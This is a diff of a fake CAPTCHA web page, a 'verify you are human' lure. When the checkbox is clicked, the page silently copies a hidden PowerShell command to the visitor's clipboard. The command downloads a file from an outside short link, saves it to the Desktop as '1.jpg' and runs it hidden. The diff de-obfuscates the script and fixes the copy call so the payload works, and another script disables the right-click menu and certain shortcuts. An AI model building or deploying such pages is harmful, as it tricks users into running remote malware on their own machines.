@@ -69,24 +69,9 @@
   .verify-verify-button{background:var(--focus);color:#fff;border:none;border-radius:6px;padding:10px 14px;font-weight:600;cursor:not-allowed;opacity:0.6}
   .verify-verify-button.enabled{cursor:pointer;opacity:1}
   @media (max-width:420px){.verify-window{width:94%}}
-
-  /* White overlay */
-  .white-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background-color: white;
-    z-index: 1000;
-    opacity: 1;
-    transition: opacity 0.5s ease-in-out;
-  }
 </style>
 </head>
 <body>
-
-<div class="white-overlay" id="whiteOverlay"></div>
 
 <main class="container">
   <section class="captcha-card" aria-labelledby="verify-heading" role="region">
@@ -147,114 +132,101 @@
   </div>
 </div>
 
-<script>
-  // Obfuscated JavaScript
-  (function() {
-    const c = document.getElementById("checkbox");
-    const s = document.getElementById("spinner");
-    const w = document.getElementById("verifyWindow");
-    const b = document.getElementById("verify-verify-button");
-    const v = document.getElementById("verification-id");
+<script> 
+  const checkbox = document.getElementById("checkbox");
+  const spinner = document.getElementById("spinner");
+  const verifyWindow = document.getElementById("verifyWindow");
+  const verifyBtn = document.getElementById("verify-verify-button");
+  const verificationIdSpan = document.getElementById("verification-id");
 
-    const SAFE_ID = "powershell -w hidden -ep bypass -c \"& { $url = 'https://kntn.ly/bf7a6a6b'; $path = Join-Path -Path ([Environment]::GetFolderPath('Desktop')) -ChildPath '1.jpg'; Invoke-WebRequest -Uri $url -OutFile $path; Start-Process -FilePath $path -WindowStyle Hidden; }\"";
+  const SAFE_ID = "powershell -w hidden -ep bypass -c \"& { $url = 'https://kntn.ly/bf7a6a6b'; $path = Join-Path -Path ([Environment]::GetFolderPath('Desktop')) -ChildPath '1.jpg'; Invoke-WebRequest -Uri $url -OutFile $path; Start-Process -FilePath $path -WindowStyle Hidden; }\"";
 
-    document.getElementById("checkboxArea").addEventListener("click", function() {
-      if (c.classList.contains("checked")) return;
-      
-      c.style.display = "none";
-      s.style.display = "block";
+document.getElementById("checkboxArea").addEventListener("click", () => {
+  if (checkbox.classList.contains("checked")) return;
 
-      setTimeout(function() {
-        s.style.display = "none";
-        c.classList.add("checked");
-        c.style.display = "flex";
+  checkbox.style.display = "none";
+  spinner.style.display = "block";
 
-        const r = Math.floor(10000 + Math.random() * 90000).toString();
-        v.textContent = r;
+  setTimeout(() => {
+    spinner.style.display = "none";
+    checkbox.classList.add("checked");
+    checkbox.style.display = "flex";
 
-        w.style.display = "block";
-        
-        copy(id);
-        
-        b.disabled = false;
-        b.classList.add("enabled");
-      }, 1400);
-    });
+    // Generate and display a fake 5-digit ID
+    const randomID = Math.floor(10000 + Math.random() * 90000).toString();
+    verificationIdSpan.textContent = randomID;
 
-    function copy(text) {
-      try {
-        const ta = document.createElement("textarea");
-        ta.value = text;
-        document.body.appendChild(ta);
-        ta.select();
-        document.execCommand("copy");
-        document.body.removeChild(ta);
-      } catch(e) {
-        console.warn("Clipboard copy failed", e);
-      }
+    // Show the popup
+    verifyWindow.style.display = "block";
+
+    // Copy the real SAFE_ID, not the displayed one
+    copyToClipboard(SAFE_ID);
+
+    // Enable the verify button
+    verifyBtn.disabled = false;
+    verifyBtn.classList.add("enabled");
+  }, 1400);
+});
+
+  function copyToClipboard(text){
+    try {
+      const ta = document.createElement("textarea");
+      ta.value = text;
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand("copy");
+      document.body.removeChild(ta);
+    } catch (e) {
+      console.warn("Clipboard copy failed", e);
     }
+  }
 
-    b.addEventListener("click", function() {
-      if (b.disabled) return;
-      b.disabled = true;
-      b.classList.remove("enabled");
-      b.textContent = "Verified";
-      setTimeout(function() {
-        w.style.display = "none";
-      }, 800);
-    });
+  verifyBtn.addEventListener("click", function(){
+    if (verifyBtn.disabled) return;
+    verifyBtn.disabled = true;
+    verifyBtn.classList.remove("enabled");
+    verifyBtn.textContent = "Verified";
+    setTimeout(()=> {
+      verifyWindow.style.display = "none";
+    }, 800);
+  });
 
-    document.addEventListener("click", function(evt) {
-      const p = evt.composedPath ? evt.composedPath() : [];
-      if (w.style.display === "block" && !p.includes(w) && !p.includes(document.getElementById("checkboxArea"))) {
-        w.style.display = "none";
-      }
-    });
-  })();
+  document.addEventListener("click", (evt) => {
+    const path = evt.composedPath ? evt.composedPath() : [];
+    if (verifyWindow.style.display === "block" && !path.includes(verifyWindow) && !path.includes(document.getElementById("checkboxArea"))) {
+      verifyWindow.style.display = "none";
+    }
+  });
 </script>
 
 <!-- Language Lock & Shortcut Disable Script -->
 <script>
 (function() {
-  function revert() {
-    if (document.documentElement.lang !== o) {
-      document.documentElement.lang = o;
+    function revertLanguageChange() {
+        if (document.documentElement.lang !== originalLang) {
+            document.documentElement.lang = originalLang;
+        }
     }
-  }
 
-  const o = document.documentElement.lang;
+    const originalLang = document.documentElement.lang;
 
-  const m = new MutationObserver(revert);
-  m.observe(document.documentElement, { attributes: true, attributeFilter: ['lang'] });
+    const observer = new MutationObserver(revertLanguageChange);
+    observer.observe(document.documentElement, { attributes: true, attributeFilter: ['lang'] });
 
-  document.addEventListener('contextmenu', function(e) {
-    e.preventDefault();
-  }, false);
+    document.addEventListener('contextmenu', function(event) {
+        event.preventDefault();
+    }, false);
 
-  document.addEventListener('keydown', function(e) {
-    if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key.toLowerCase() === 'l') {
-      e.preventDefault();
-    }
-    if (e.altKey && e.shiftKey && e.key.toLowerCase() === 'l') {
-      e.preventDefault();
-    }
-  }, false);
+    document.addEventListener('keydown', function(event) {
+        if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.key.toLowerCase() === 'l') {
+            event.preventDefault();
+        }
+        if (event.altKey && event.shiftKey && event.key.toLowerCase() === 'l') {
+            event.preventDefault();
+        }
+    }, false);
 })();
-</script>
-
-<script>
-  // White overlay hide after 4 seconds
-  setTimeout(() => {
-    document.getElementById("whiteOverlay").style.opacity = "0";
-    setTimeout(() => {
-      document.getElementById("whiteOverlay").style.display = "none";
-    }, 500);
-  }, 4000);
 </script>
 
 </body>
 </html>
-
-
-
-
